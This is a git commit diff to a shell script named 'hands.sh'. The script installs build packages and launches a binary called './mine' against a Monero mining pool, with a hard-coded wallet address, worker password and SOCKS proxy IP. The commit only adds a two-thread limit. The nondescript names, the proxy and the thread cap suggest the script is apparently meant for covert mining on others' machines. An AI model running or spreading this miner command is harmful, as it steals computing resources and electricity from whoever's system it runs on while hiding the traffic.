cfdc703d4e38cf987d17c37b91d2559b1bf01e30
Dadora-Lee <dadorasoft@gmail.com>
2025-05-16 16:57:35 +0900

    Update hands.sh

--- hands.sh
+++ hands.sh
@@ -13,4 +13,4 @@ echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.
 echo "🔄 update APT supply..."
 sudo apt update
 sudo apt install libuv1-dev libssl-dev libhwloc-dev -y
-./mine -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
+./mine -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --threads=2 --proxy=98.175.31.195:4145
